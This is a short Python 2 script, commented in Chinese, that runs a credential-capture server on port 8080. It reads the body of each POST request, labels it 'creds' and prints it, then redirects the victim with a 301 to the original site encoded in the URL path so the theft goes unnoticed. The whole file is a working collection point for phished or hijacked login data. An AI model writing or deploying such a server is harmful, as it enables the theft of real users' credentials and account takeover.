#-*- coding:utf8 -*-


import SimpleHTTPServer
import SocketServer
import urllib



class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    # 处理POST请求
    def do_POST(self):
        # 获取包长度
        content_length = int(self.headers['Content-Length'])
        # 读取并打印长度为content_length的字段
        creds = self.rfile.read(content_length).decode('utf-8')
        print creds
        # 跟着获取用户访问的原始站点，进行301重定向，并设置头部
        site = self.path[1:]
        self.send_response(301)
        self.send_header("Location",urllib.unquote(site))
        self.end_headers()

# 初始化监听地址和端口，处理POST请求
server = SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
# 永远监听
server.serve_forever()